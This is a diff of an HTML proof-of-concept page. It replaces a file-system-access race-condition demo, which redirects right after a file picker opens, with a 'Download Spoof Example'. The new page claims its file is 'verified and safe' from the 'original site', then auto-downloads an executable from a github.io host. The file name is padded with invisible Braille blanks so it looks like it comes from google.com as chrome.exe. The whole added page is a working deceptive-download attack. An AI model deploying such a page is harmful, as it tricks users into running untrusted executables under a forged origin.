@@ -1,114 +1,83 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>Vulnerable File System Access PoC</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Download Spoof Example</title>
   <style>
     body {
-      margin: 0;
-      font-family: -apple-system, BlinkMacSystemFont, system-ui;
-      background: #f5f5f7;
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
       text-align: center;
+      padding: 50px;
     }
-    button {
-      font-size: 15px;
-      padding: 10px 14px;
+
+    .container {
+      background: white;
+      width: 400px;
+      margin: 0 auto;
+      padding: 20px;
       border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+
+    h1 {
+      font-size: 24px;
+      color: #333;
+    }
+
+    p {
+      font-size: 16px;
+      color: #555;
+    }
+
+    .button {
+      background-color: #4CAF50;
       border: none;
-      background: #007aff;
-      color: #fff;
-    }
-    #panel {
-      display: none;
-      max-width: 420px;
-      margin: 80px auto;
-      background: #fff;
-      padding: 24px;
-      border-radius: 16px;
-      box-shadow: 0 20px 60px rgba(0,0,0,.2);
+      color: white;
+      padding: 15px 32px;
       text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 18px;
+      margin: 10px 2px;
+      cursor: pointer;
+      border-radius: 5px;
+      transition: background-color 0.3s ease;
     }
-    .notice {
-      margin-top: 14px;
-      font-size: 13px;
-      color: #b00020;
+
+    .button:hover {
+      background-color: #45a049;
+    }
+
+    .note {
+      font-size: 14px;
+      color: #777;
+      margin-top: 15px;
     }
   </style>
 </head>
-
 <body>
 
-<div style="text-align:center; margin-top:60px;">
-  <button id="trigger">Start PoC</button>
-</div>
-
-<div id="panel">
-  <h2>File System Access (Vulnerable)</h2>
-  <p>Tap the button below to request file access, then observe how the page behaves.</p>
-
-  <button id="openFile">Open File</button>
-  <button id="saveFile">Save File</button>
-  <p id="status">Status: -</p>
-
-  <div class="notice">
-    <b>Warning:</b> Watch for sudden redirects or unexpected behavior
+  <div class="container">
+    <h1>Download From Original Site</h1>
+    <p>Click the button below to download the file from the original site. <br> 
+    This file is verified and safe to download.</p>
+    <input type="button" class="button" value="Download File" onclick="a()">
+    <div class="note">
+      <p>Note: Always ensure the source is trusted before downloading files.</p>
+    </div>
   </div>
-</div>
 
-<script>
-  const panel = document.getElementById('panel');
-  const trigger = document.getElementById('trigger');
-  const openFileBtn = document.getElementById('openFile');
-  const saveFileBtn = document.getElementById('saveFile');
-  const status = document.getElementById('status');
-
-  trigger.onclick = () => {
-    // Just display the panel without changing the history or URL
-    panel.style.display = 'block';
-  };
-
-  // Open file (vulnerable version)
-  openFileBtn.onclick = async () => {
-    try {
-      // Try to open a file
-      const [fileHandle] = await window.showOpenFilePicker();
-      const file = await fileHandle.getFile();
-      const fileContent = await file.text();
-      status.textContent = `Opened file: ${file.name} with content: ${fileContent.substring(0, 100)}...`;
-
-      // Trigger a race condition by redirecting immediately after file access request
-      setTimeout(() => {
-        // Change location right after file interaction begins (before it's fully completed)
-        window.location.href = 'https://example.com'; // Redirect to another page
-      }, 50); // 50ms delay to trigger race condition
-
-    } catch (e) {
-      status.textContent = 'Failed to open file or permission denied';
+  <script>
+    function a() {
+      // Step 1: Create a temporary <a> element to trigger the download
+      var link = document.createElement('a');
+      link.href = 'https://ecdnts-del.github.io/test-apk/From⠀google.com ⠀⠀⠀⠀⠀⠀ chrome.exe'; // Make sure this is a valid file URL for download
+      link.download = 'From⠀www.google.com ⠀⠀⠀⠀⠀ chrome.exe'; // Set the filename for download
+      link.click(); // Trigger the download
     }
-  };
-
-  // Save file (vulnerable version)
-  saveFileBtn.onclick = async () => {
-    try {
-      const fileHandle = await window.showSaveFilePicker();
-      const writable = await fileHandle.createWritable();
-      await writable.write('This is some file content.');
-      await writable.close();
-      status.textContent = 'File saved successfully!';
-
-      // Trigger a race condition by redirecting immediately after saving file
-      setTimeout(() => {
-        // Change location right after file access request starts
-        window.location.href = 'https://example.com'; // Redirect to another page
-      }, 50); // 50ms delay to trigger race condition
-
-    } catch (e) {
-      status.textContent = 'Failed to save file or permission denied';
-    }
-  };
-</script>
+  </script>
 
 </body>
 </html>
